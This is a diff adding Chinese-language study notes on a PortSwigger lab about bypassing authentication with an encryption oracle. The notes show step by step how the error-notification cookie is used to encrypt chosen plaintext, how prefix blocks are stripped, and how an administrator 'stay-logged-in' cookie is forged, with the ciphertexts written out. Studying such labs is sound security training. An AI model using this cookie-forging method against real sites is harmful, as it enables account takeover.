@@ -1,0 +1,100 @@
+https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-encryption-oracle
+更改邮件功能在提交错误格式邮件地址时
+响应为 
+Set-Cookie: notification=
+之后显示的提示似乎与此字符串有关
+<header class="notification-header">
+
+输入
+aaaa
+得到 44加密字符
+8AXNH6/sFrT3GkA9EORbDHBPxTraF2Zeo/79gj84KSE=
+
+aaaaaaaa 8字符内 得到44加密字符
+8AXNH6/sFrT3GkA9EORbDCz9fcOPTATNIjkg9cjOFDE=
+
+aaaaaaaaa 9-24字符 得到64加密字符
+8AXNH6/sFrT3GkA9EORbDMII48JDgwfuTVN1IYCZLs61WFBMx58TNojeR3YdLeqr
+
+aaaaaaaaaaaaaaaaaaaaaaaaa 25-40字符 得到88加密字符
+8AXNH6/sFrT3GkA9EORbDMII48JDgwfuTVN1IYCZLs7XaLCav56N12OgdDH/zTgutVhQTMefEzaI3kd2HS3qqw==
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa 41字符 得到108加密字符
+8AXNH6/sFrT3GkA9EORbDMII48JDgwfuTVN1IYCZLs7XaLCav56N12OgdDH/zTgu12iwmr+ejddjoHQx/804LrVYUEzHnxM2iN5Hdh0t6qs=
+
+截取的44密文字符
+12iwmr+ejddjoHQx/804LrVYUEzHnxM2iN5Hdh0t6qs=
+解码为 16明文字符 -> 那么前面25个明文为填充
+aaaaaaaaaaaaaaaa
+
+开头的字符相同
+8AXNH6/sFrT3GkA9EORbD
+推测为 23个固定明文字符
+Invalid email address: 
+
+# 尝试截取密文后解码查看格式是否通过，再增加明文字符数量重复此过程
+108-44=64
+64 个密文字符为填充
+64/4*3=48 一共48个密文填充
+48=23+25
+固定填充 + 手动填充 + 截取
+填充应当为某个倍数
+同时，填充密文数量+截取密文数量也应当拥有对应总长度的项 ：108对应，而48密文总填充+44=92无对应
+
+尝试时得到多种错误信息
+Input byte[] should at least have 2 bytes for base64 bytes
+输入 byte[] 至少应包含 2 个字节的 base64 字节
+Input byte array has wrong 4-byte ending unit
+输入字节数组具有错误的 4 字节结尾单元。
+Input length must be multiple of 16 when decrypting with padded cipher
+使用填充密码解密时，输入长度必须是 16 的倍数。
+
+
+持久cookie为 44字符
+bqW9DyfFbouAbf73o/LVxCDN/7GHd05h/YgZ+C81rv8=
+PYL4IjMVMs2JTj7RwGeMF4F7RlKNUkZh7OzJdJh0RiE=
+0Mcn1sm0Oi3m12i3uCFkbUfgnNxv0JESLTyXb1rZ/fk=
+
+将持久cookie字符串复制到邮件错误提示cookie中
+qH4ASuW602xpGUcYtVDGe74I2xyubAz6AoekwPelfsg=
+得到
+wiener:1759846113858
+位用户名与unix毫秒级13位时间戳组合
+
+尝试第25个字符开始，至少到41个字符以达到108-64=44个字符的截取
+
+
+
+
+构建41原始字符  25填充+20构造
+aaaaaaaaaaaaaaaaaaaaaaaaawiener:1759846113858
+得到
+8AXNH6/sFrT3GkA9EORbDMII48JDgwfuTVN1IYCZLs7XaLCav56N12OgdDH/zTguqH4ASuW602xpGUcYtVDGe74I2xyubAz6AoekwPelfsg=
+截取最后44个加密字符
+qH4ASuW602xpGUcYtVDGe74I2xyubAz6AoekwPelfsg=
+成功从明文还原到加密字符
+
+
+admin:1759849175874
+构建第一个管理员攻击字符串 25填充+19构造
+aaaaaaaaaaaaaaaaaaaaaaaaaadmin:1759849175874
+得到
+8AXNH6/sFrT3GkA9EORbDMII48JDgwfuTVN1IYCZLs7XaLCav56N12OgdDH/zTguDW5zSuIIJkAnMG1u207jI8Ov6I4Lf1QvKSKhQdqrtNU=
+截取最后44个加密字符
+DW5zSuIIJkAnMG1u207jI8Ov6I4Lf1QvKSKhQdqrtNU=
+登录失败
+
+
+administrator:1759849175874
+构建第二个管理员攻击字符串 25填充+27构造
+aaaaaaaaaaaaaaaaaaaaaaaaaadministrator:1759849175874
+得到
+8AXNH6/sFrT3GkA9EORbDMII48JDgwfuTVN1IYCZLs7XaLCav56N12OgdDH/zTguSw9aNbcpm0qEU+MUV9OEmHVnJylCgnLI+zxkMg2DBjY=
+截取最后44个加密字符
+Sw9aNbcpm0qEU+MUV9OEmHVnJylCgnLI+zxkMg2DBjY=
+管理员账户登录成功
+
+
+@ 示例解决方案为：使用无效的电子邮件地址提交评论
+@
+
